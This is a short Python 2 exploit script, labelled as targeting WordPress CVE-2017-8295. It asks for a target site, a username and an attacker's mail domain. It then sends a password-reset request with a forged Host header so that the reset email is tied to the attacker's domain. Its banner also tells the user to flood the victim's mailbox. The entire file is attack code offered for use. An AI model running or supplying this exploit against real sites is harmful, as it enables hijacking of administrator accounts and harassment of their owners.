#! /usr/bin/python

import httplib, urllib
import sys

print("""
Wordpress exploit CVE-2017-8295 v1.0 - www.incode.cl
1. Get wordpress Username and Email
2. Generate DoS in User Email
3. Create Your Email 'wordpress@tudomain.com'
Continue with the exploit ...
""")

url = raw_input("4. Enter The Wordpress URL (ex: http://misitio.com) : \n")

if len(url) > 5:

	user = raw_input("5. Enter The WP Username (ex: admin): \n")
	
	if len(user) <= 1:
		print ("Invalid user. Finished.")
		sys.exit()


	#
	domain = raw_input("6. Enter The Domain of Your Mail Server (eg: mydomain.com): \n")

	if len(domain) > 4:
		url2 = url + "/wp-login.php?action=lostpassword"
		print("\nSending data a: " + url2 + "\n")
		values = {'user_login' : user, 'redirect_to' : '', 'wp-submit' : 'Get+New+Password'}
	
		data   = urllib.urlencode(values)
		
		headers = { "Content-type": "application/x-www-form-urlencoded", "Content-Length" : str(len(data)), "Host": domain}		
	
		host = url.replace("http://","").replace("https://","").replace("www.","") + ":80"

		print ("\nConnecting To Host: " + host)
	
		conn = httplib.HTTPConnection(host)
		conn.request("POST", url2, data, headers)
	
	    
	   	resp = conn.getresponse()
		print("\nHTTP Response: " + str(resp.status))

		print("\nFinished\n")		

	else:
		print("\nInvalid Domain, Finished.")
	
else:
	print("\nInvalid URL, Finished.")
